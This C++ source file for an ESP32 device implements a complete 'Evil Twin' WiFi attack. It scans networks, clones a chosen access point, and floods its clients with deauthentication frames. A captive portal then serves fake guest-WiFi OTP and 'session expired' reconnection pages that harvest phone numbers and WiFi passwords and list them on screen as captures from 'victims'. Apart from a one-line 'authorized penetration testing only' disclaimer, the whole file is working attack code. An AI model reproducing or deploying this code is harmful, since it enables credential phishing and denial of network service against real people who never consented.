// Educational Evil Twin - Authorized penetration testing only
#include "config.h"
#include "icon.h"
#include "evil_twin.h"
#include <DNSServer.h>
#include <WebServer.h>

namespace EvilTwin {

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

char customSSID[33] = "Free_WiFi";
int ssidLen = 9;
const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_- >";
int charIndex = 0;
const int charsetLen = 66;

bool serverActive = false;
int evilTwinMode = 0;
bool modeSelected = false;

// Mode 0 preset state
int presetIndex = 0;
int presetScroll = 0;
bool presetChosen = false;
bool useCustomSSID = false;

// Mode 1 scan/deauth state
const int MAX_SCAN = 20;
wifi_ap_record_t scanList[MAX_SCAN];
int scanCount = 0;
int scanIndex = 0;
int scanScroll = 0;
bool scanDone = false;
bool targetSelected = false;
uint8_t targetChannel = 1;
uint8_t targetBSSID[6];
uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0x00, 0x00, 0x01, 0x00
};
uint32_t lastDeauthTime = 0;

// Credential storage
const int MAX_CAPTURES = 10;
CapturedCredential captures[MAX_CAPTURES];
int captureCount = 0;
int captureScrollIndex = 0;
bool newCredentials = false;

unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 200;

// ---- HTML: Mode 0 Phone Portal ----
const char html_phone[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Guest Wi-Fi</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f4f4f4;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
.c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 8px 16px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}
h2{color:#333;margin-bottom:5px}p{color:#777;margin-bottom:25px;font-size:14px}
.fg{text-align:left;margin-bottom:15px}.iw{position:relative;display:flex;align-items:center}
.cc{position:absolute;left:12px;color:#333;font-size:16px;font-weight:500;pointer-events:none}
input[type=tel]{width:100%;padding:12px 12px 12px 50px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}
label{display:block;color:#555;margin-bottom:5px;font-weight:600;font-size:14px}
.btn{background:#007bff;color:#fff;border:none;padding:14px;width:100%;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px}
.ft{margin-top:20px;font-size:12px;color:#aaa}
.st{color:#007bff;font-size:16px;font-weight:700;margin-top:15px;display:none}
.sp{margin:15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;animation:s 1s linear infinite;display:none}
@keyframes s{to{transform:rotate(360deg)}}
</style></head><body><div class="c">
<h2>Guest Wi-Fi</h2>
<p>Please enter your phone number to receive an SMS with your One-Time Password (OTP) to connect.</p>
<form id="f"><div class="fg"><label>Phone Number</label>
<div class="iw"><span class="cc">+63</span>
<input type="tel" id="ph" name="phone" placeholder="9123456789" pattern="9[0-9]{9}" maxlength="10" minlength="10" required>
</div></div><button type="submit" class="btn">Send OTP</button></form>
<div id="sp" class="sp"></div><div id="st" class="st"></div>
<div class="ft">By connecting, you agree to our Terms of Service and Privacy Policy.</div>
</div><script>
document.getElementById('f').onsubmit=function(e){e.preventDefault();
var p=document.getElementById('ph').value;
document.getElementById('f').style.display='none';
document.getElementById('sp').style.display='block';
document.getElementById('st').style.display='block';
document.getElementById('st').innerText='Requesting OTP...';
var x=new XMLHttpRequest();x.open('POST','/login',true);
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.send('phone='+encodeURIComponent(p));
setTimeout(function(){document.getElementById('sp').style.display='none';
document.getElementById('st').innerText='OTP Sent! Check your SMS.';
document.getElementById('st').style.color='#28a745';},2500);};
</script></body></html>
)rawliteral";

// ---- HTML: Mode 1 WiFi Password Portal (no signal emoji) ----
const char html_password[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Reconnect</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f4f4f4;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
.c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 8px 16px rgba(0,0,0,.1);width:90%;max-width:400px;text-align:center}
h2{color:#333;margin-bottom:5px}
.al{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:12px;margin-bottom:20px;color:#856404;font-size:13px;text-align:left}
.fg{text-align:left;margin-bottom:15px}
label{display:block;color:#555;margin-bottom:5px;font-weight:600;font-size:14px}
input[type=password]{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;font-size:16px}
.btn{background:#007bff;color:#fff;border:none;padding:14px;width:100%;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px}
.ft{margin-top:20px;font-size:12px;color:#aaa}
.st{color:#007bff;font-size:16px;font-weight:700;margin-top:15px;display:none}
.sp{margin:15px auto;width:30px;height:30px;border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;animation:s 1s linear infinite;display:none}
@keyframes s{to{transform:rotate(360deg)}}
</style></head><body><div class="c">
<h2>WiFi Reconnection Required</h2>
<div class="al">Your session has expired. Please re-enter your WiFi password to reconnect.</div>
<form id="f"><div class="fg"><label>WiFi Password</label>
<input type="password" id="pw" name="wifipass" placeholder="Enter your WiFi password" required>
</div><button type="submit" class="btn">Reconnect</button></form>
<div id="sp" class="sp"></div><div id="st" class="st"></div>
<div class="ft">Secure connection provided by your network administrator.</div>
</div><script>
document.getElementById('f').onsubmit=function(e){e.preventDefault();
var p=document.getElementById('pw').value;
document.getElementById('f').style.display='none';
document.getElementById('sp').style.display='block';
document.getElementById('st').style.display='block';
document.getElementById('st').innerText='Validating connection...';
var x=new XMLHttpRequest();x.open('POST','/login',true);
x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.send('wifipass='+encodeURIComponent(p));
setTimeout(function(){document.getElementById('sp').style.display='none';
document.getElementById('st').innerText='Connected! Redirecting...';
document.getElementById('st').style.color='#28a745';},3000);};
</script></body></html>
)rawliteral";

// ---- Web Handlers ----
void handleRoot() {
  if (evilTwinMode == 0) webServer.send(200, "text/html", html_phone);
  else webServer.send(200, "text/html", html_password);
}

void handleLogin() {
  if (evilTwinMode == 0 && webServer.hasArg("phone")) {
    if (captureCount < MAX_CAPTURES) {
      captures[captureCount] = {"phone", "+63 " + webServer.arg("phone"), String(customSSID), millis()};
      captureCount++;
    }
    newCredentials = true;
    Serial.println("--- CAPTURED (Phone) ---");
    Serial.print("Phone: +63 "); Serial.println(webServer.arg("phone"));
  } else if (evilTwinMode == 1 && webServer.hasArg("wifipass")) {
    if (captureCount < MAX_CAPTURES) {
      captures[captureCount] = {"password", webServer.arg("wifipass"), String(customSSID), millis()};
      captureCount++;
    }
    newCredentials = true;
    Serial.println("--- CAPTURED (Password) ---");
    Serial.print("Pass: "); Serial.println(webServer.arg("wifipass"));
  }
  webServer.send(200, "text/plain", "OK");
}

// ---- Server Start (Mode 0: normal AP, Mode 1: cloned AP + deauth init) ----
void startServer() {
  if (evilTwinMode == 1) {
    // Mode 1: Clone target AP on same channel
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(customSSID, NULL, targetChannel);
    esp_wifi_set_max_tx_power(82);
    // Prepare deauth frame with target BSSID
    memcpy(&deauthFrame[10], targetBSSID, 6);
    memcpy(&deauthFrame[16], targetBSSID, 6);
    lastDeauthTime = 0;
  } else {
    // Mode 0: Normal open AP
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(customSSID);
  }
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.onNotFound(handleRoot);
  webServer.begin();
  serverActive = true;
  setNeoPixelColour("red");
  Serial.print("Evil Twin on SSID: "); Serial.println(customSSID);
  Serial.print("Mode: "); Serial.println(evilTwinMode == 0 ? "Phone" : "WiFi Pass + Deauth");
}

// ---- Send Deauth Burst (Mode 1 only, called in server loop) ----
void sendDeauth() {
  if (evilTwinMode != 1) return;
  unsigned long now = millis();
  if (now - lastDeauthTime >= 100) {
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    lastDeauthTime = now;
  }
}

// ---- Mode Selection Menu ----
void drawModeMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(10, 10, "Evil Twin Mode:");
  u8g2.setFont(u8g2_font_5x8_tr);
  if (evilTwinMode == 0) { u8g2.drawBox(0, 16, 128, 12); u8g2.setDrawColor(0); }
  u8g2.drawStr(4, 25, "0: Phone Harvesting");
  u8g2.setDrawColor(1);
  if (evilTwinMode == 1) { u8g2.drawBox(0, 30, 128, 12); u8g2.setDrawColor(0); }
  u8g2.drawStr(4, 39, "1: WiFi Password");
  u8g2.setDrawColor(1);
  u8g2.drawStr(0, 54, "U/D: Switch Mode");
  u8g2.drawStr(0, 63, "R: Confirm | C: Exit");
  u8g2.sendBuffer();
}

void handleModeInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW || digitalRead(BUTTON_DOWN_PIN) == LOW) {
      evilTwinMode = 1 - evilTwinMode;
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      modeSelected = true;
      lastDebounceTime = now;
    }
  }
}

// ---- Mode 0: Preset SSID Menu ----
void drawPresetMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 8, "Select SSID:");
  int visible = 5;
  for (int i = 0; i < visible; i++) {
    int idx = presetScroll + i;
    if (idx >= SSID_PRESET_COUNT) break;
    int y = 20 + i * 10;
    if (idx == presetIndex) u8g2.drawStr(0, y, ">");
    u8g2.drawStr(8, y, SSID_PRESETS[idx]);
  }
  if (presetScroll > 0) u8g2.drawStr(122, 20, "^");
  if (presetScroll + visible < SSID_PRESET_COUNT) u8g2.drawStr(122, 60, "v");
  u8g2.sendBuffer();
}

void handlePresetInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (presetIndex > 0) {
        presetIndex--;
        if (presetIndex < presetScroll) presetScroll--;
      }
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (presetIndex < SSID_PRESET_COUNT - 1) {
        presetIndex++;
        if (presetIndex >= presetScroll + 5) presetScroll++;
      }
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      presetChosen = true;
      if (presetIndex == SSID_PRESET_COUNT - 1) {
        // Last item = custom keyboard
        useCustomSSID = true;
        customSSID[0] = '\0';
        ssidLen = 0;
      } else {
        strncpy(customSSID, SSID_PRESETS[presetIndex], sizeof(customSSID) - 1);
        customSSID[sizeof(customSSID) - 1] = '\0';
        ssidLen = strlen(customSSID);
        startServer();
      }
      lastDebounceTime = now;
    }
  }
}

// ---- Mode 1: WiFi Scan & Target Selection ----
void doWifiScan() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(10, 30, "Scanning WiFi...");
  u8g2.sendBuffer();
  setNeoPixelColour("white");

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  int n = WiFi.scanNetworks();
  scanCount = min(n, MAX_SCAN);
  for (int i = 0; i < scanCount; i++) {
    memcpy(scanList[i].bssid, WiFi.BSSID(i), 6);
    strncpy((char*)scanList[i].ssid, WiFi.SSID(i).c_str(), sizeof(scanList[i].ssid));
    scanList[i].rssi = WiFi.RSSI(i);
    scanList[i].primary = WiFi.channel(i);
  }
  // Sort by RSSI descending
  for (int i = 0; i < scanCount - 1; i++)
    for (int j = i + 1; j < scanCount; j++)
      if (scanList[j].rssi > scanList[i].rssi) {
        wifi_ap_record_t tmp = scanList[i];
        scanList[i] = scanList[j];
        scanList[j] = tmp;
      }
  scanDone = true;
  scanIndex = 0;
  scanScroll = 0;
  setNeoPixelColour("0");
}

void drawScanScreen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 8, "Select Target AP:");
  if (scanCount == 0) {
    u8g2.drawStr(10, 30, "No networks found");
    u8g2.drawStr(10, 42, "R: Rescan | C: Exit");
    u8g2.sendBuffer();
    return;
  }
  int visible = 5;
  for (int i = 0; i < visible; i++) {
    int idx = scanScroll + i;
    if (idx >= scanCount) break;
    int y = 20 + i * 10;
    if (idx == scanIndex) u8g2.drawStr(0, y, ">");
    String name = String((char*)scanList[idx].ssid).substring(0, 10);
    String info = name + " " + String(scanList[idx].rssi);
    u8g2.drawStr(8, y, info.c_str());
  }
  if (scanScroll > 0) u8g2.drawStr(122, 20, "^");
  if (scanScroll + visible < scanCount) u8g2.drawStr(122, 60, "v");
  u8g2.sendBuffer();
}

void handleScanInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (scanIndex > 0) { scanIndex--; if (scanIndex < scanScroll) scanScroll--; }
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (scanIndex < scanCount - 1) { scanIndex++; if (scanIndex >= scanScroll + 5) scanScroll++; }
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      if (scanCount == 0) {
        scanDone = false; // trigger rescan
      } else {
        // Select target
        strncpy(customSSID, (char*)scanList[scanIndex].ssid, sizeof(customSSID) - 1);
        customSSID[sizeof(customSSID) - 1] = '\0';
        ssidLen = strlen(customSSID);
        targetChannel = scanList[scanIndex].primary;
        memcpy(targetBSSID, scanList[scanIndex].bssid, 6);
        targetSelected = true;
        startServer();
      }
      lastDebounceTime = now;
    }
  }
}

// ---- SSID Keyboard (Mode 0 custom only) ----
void drawKeyboard() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 15, "Evil Twin SSID:");
  u8g2.drawStr(0, 30, customSSID);
  int strWidth = u8g2.getStrWidth(customSSID);
  char sel[2] = {charset[charIndex], '\0'};
  if (charset[charIndex] == '>') {
    u8g2.drawBox(strWidth, 21, 24, 11); u8g2.setDrawColor(0);
    u8g2.drawStr(strWidth + 2, 30, "RUN"); u8g2.setDrawColor(1);
  } else {
    u8g2.drawBox(strWidth, 21, 8, 11); u8g2.setDrawColor(0);
    u8g2.drawStr(strWidth + 1, 30, sel); u8g2.setDrawColor(1);
  }
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 50, "U/D: Change Char");
  u8g2.drawStr(0, 63, "L: Del | R: Add/Run | C: Exit");
  u8g2.sendBuffer();
}

void handleKeyboardInput() {
  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      charIndex = (charIndex + 1) % charsetLen; lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      charIndex = (charIndex - 1 + charsetLen) % charsetLen; lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
      if (ssidLen > 0) { ssidLen--; customSSID[ssidLen] = '\0'; }
      lastDebounceTime = now;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      if (charset[charIndex] == '>') { if (ssidLen > 0) startServer(); }
      else if (ssidLen < 31) { customSSID[ssidLen] = charset[charIndex]; ssidLen++; customSSID[ssidLen] = '\0'; }
      lastDebounceTime = now;
    }
  }
}

// ---- Server Active Screen ----
void drawServerScreen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_5x8_tr);
  if (captureCount == 0) {
    u8g2.drawStr(0, 10, "Evil Twin Active");
    u8g2.drawStr(0, 20, evilTwinMode == 0 ? "[Phone Mode]" : "[Password+Deauth]");
    u8g2.drawStr(0, 30, "SSID:"); u8g2.drawStr(30, 30, customSSID);
    u8g2.drawStr(0, 50, "Waiting for victims...");
  } else {
    u8g2.drawStr(0, 10, evilTwinMode == 0 ? "Captured Phones:" : "Captured Passwords:");
    int drawCount = min(4, captureCount - captureScrollIndex);
    for (int i = 0; i < drawCount; i++) {
      int idx = captureScrollIndex + i;
      String s = String(idx + 1) + ". " + captures[idx].value;
      u8g2.drawStr(0, 25 + (i * 10), s.c_str());
    }
    if (captureScrollIndex > 0) u8g2.drawStr(120, 25, "^");
    if (captureScrollIndex + 4 < captureCount) u8g2.drawStr(120, 55, "v");
    setNeoPixelColour("green");
  }
  u8g2.sendBuffer();
}

// ---- Setup & Loop ----
void eviltwinSetup() {
  Serial.begin(115200);
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_PIN_LEFT, INPUT_PULLUP);
  pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BUTTON_SELECT_PIN, INPUT_PULLUP);
  esp_bt_controller_deinit();
  WiFi.disconnect();
  // Reset all state
  serverActive = false;
  modeSelected = false;
  presetChosen = false;
  useCustomSSID = false;
  presetIndex = 0;
  presetScroll = 0;
  scanDone = false;
  targetSelected = false;
  newCredentials = false;
  captureCount = 0;
  captureScrollIndex = 0;
  charIndex = 0;
  strcpy(customSSID, "Free_WiFi");
  ssidLen = 9;
  for (int i = 0; i < MAX_CAPTURES; i++) captures[i] = {"", "", "", 0};
  setNeoPixelColour("purple");
}

void eviltwinLoop() {
  // Phase 0: Mode selection
  if (!modeSelected) {
    handleModeInput();
    drawModeMenu();
    return;
  }

  // Phase 1: SSID selection (mode-specific)
  if (!serverActive) {
    if (evilTwinMode == 0) {
      // Mode 0: Preset list, then optional custom keyboard
      if (!presetChosen) {
        handlePresetInput();
        drawPresetMenu();
        return;
      }
      if (useCustomSSID) {
        handleKeyboardInput();
        drawKeyboard();
        return;
      }
    } else {
      // Mode 1: WiFi scan & target selection
      if (!scanDone) { doWifiScan(); return; }
      if (!targetSelected) {
        handleScanInput();
        drawScanScreen();
        return;
      }
    }
    return;
  }

  // Phase 2: Server active
  dnsServer.processNextRequest();
  webServer.handleClient();
  sendDeauth(); // Only sends in Mode 1
  drawServerScreen();

  unsigned long now = millis();
  if (now - lastDebounceTime > debounceDelay) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (captureScrollIndex > 0) captureScrollIndex--;
      lastDebounceTime = now;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (captureScrollIndex + 4 < captureCount) captureScrollIndex++;
      lastDebounceTime = now;
    }
  }

  if (digitalRead(BUTTON_SELECT_PIN) == LOW) {
    if (now - lastDebounceTime > debounceDelay * 2) {
      WiFi.softAPdisconnect(true);
      serverActive = false;
      setNeoPixelColour("0");
      lastDebounceTime = now;
      while (digitalRead(BUTTON_SELECT_PIN) == LOW) delay(10);
    }
  }
}

} // namespace EvilTwin
